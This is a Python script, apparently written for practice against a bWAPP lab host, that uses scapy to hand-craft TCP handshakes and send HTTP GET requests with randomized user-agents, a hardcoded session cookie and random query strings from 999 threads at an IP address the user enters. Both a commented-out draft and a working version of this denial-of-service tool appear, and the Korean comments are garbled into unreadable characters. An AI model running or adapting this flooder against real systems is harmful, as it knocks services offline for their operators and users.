# from scapy.all import* #?��켓을 ?��?��?���? ?��?��
# import threading #�??��?��?��?���? 구현?���? ?��?��
# import time #�??��?��?��?���? ?��?��?���? ?��?��
# import string #URL ?��?��미터?�� �? ?�� 바꾸�? ?��?��
# import random #?��?��?�� PORT , IP ?��?�� ?��?��
# from fake_useragent import UserAgent #User-Agent 값을 ?��?��?�� ?���? ?��?��


# from scapy.all import *
# import threading
# import time
# import string
# import random
# from fake_useragent import UserAgent
# # Up-to-date simple useragent faker with real world database


# class DosAttack(Thread):
#     def __init__(self,dstip):
#          Thread.__init__(self)
#          self.dstip = dstip # ?��?��?�� IP
#          self.pkcount = 0 # ?���? ?��?�� ?��
#          self.ack = 0 #ack 번호
#          self.srcport = RandNum(1024,65535) #?��?��?�� 출발�? port
#          self.string = '' #url ?��?��미터?�� 추�???��?�� ?��?��?�� �?
#          self.srcip = '192.168.100.241' #출발�? IP
#          self.ua = UserAgent() #?��?��?�� user-agent
         
#     def hurk_dos(self):
#         self.string = "".join(random.choice(string.ascii_lowercase) for _ in range(3))
#         header = "GET: /bWAPP/xss_get.php?firstname={}&lastname=&form=submit HTTP/1.1\r\n".format(self.string) #?��?��?��?��
#         print(header)
#         header += "Host:{}\r\n".format(self.srcip)
#         header += "Cache-Control:no-cache \r\n" #Cache-Control = no-cache
#         header += "User-Agent:"+self.ua.random+"\r\n"
#         header += "Cookie: PHPSESSID=4u6q2403srssfrku7kqf8ir2u2; security_level=0\r\n" #?��?�� ?���? cookie 추�??
#         header += "\r\n"
#         packet = sr1(IP(src=self.srcip,dst=self.dstip)/TCP(sport=self.srcport,dport=80,seq=0,flags="S")) #?��?�� ?��?��
#         print(packet)
#         syn_ack = packet
#         # ack = IP(src=packet.src,dst=self.dstip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq+1)/header
#         ack = IP(src=packet.src,dst=self.dstip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq)/header
#         send(ack)
#         self.pkcount = self.pkcount + 1

    
# def main():
#     dstip = input("Attack IP Address : ")
#     for i in range(1,1000):
#         dos = DosAttack(dstip)
#         t = threading.Thread(target=dos.hurk_dos)
#         # time.sleep(0.005)
#         time.sleep(0.1)
#         t.start()

# main()

from scapy.all import IP, TCP, send, sr1
import threading
import time
import string
import random
from fake_useragent import UserAgent
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class DosAttack(threading.Thread):
    def __init__(self, dstip):
        threading.Thread.__init__(self)
        self.dstip = dstip
        self.pkcount = 0
        self.ack = 0
        self.srcport = random.randint(1024, 65535)
        self.string = ''
        self.srcip = '192.168.100.241'
        self.ua = UserAgent()

    def hurk_dos(self):
        self.string = "".join(random.choice(string.ascii_lowercase) for _ in range(3))

        header = "GET /bWAPP/xss_get.php?firstname={}&lastname=&form=submit HTTP/1.1\r\n".format(self.string)

        print(header)
        
        header += "Host: {}\r\n".format(self.srcip)
        header += "Cache-Control: no-cache\r\n"
        header += "User-Agent: {}\r\n".format(self.ua.random)
        header += "Cookie: PHPSESSID=4u6q2403srssfrku7kqf8ir2u2; security_level=0\r\n"
        header += "\r\n"
        
        # default port 80
        packet = IP(src=self.srcip, dst=self.dstip) / TCP(sport=self.srcport, dport=80, seq=0, flags="S")
        
        print(packet)
        syn_ack = sr1(packet, verbose=False)
        ack = IP(src=syn_ack.src, dst=self.dstip) / TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq) / header
        send(ack, verbose=False)
        self.pkcount = self.pkcount + 1

def main():
    dstip = input("Attack IP Address: ")
    for i in range(1, 1000):
        dos = DosAttack(dstip)
        t = threading.Thread(target=dos.hurk_dos)
        time.sleep(0.1)
        t.start()

main()



# 192.168.100.252


# 192.168.100.2
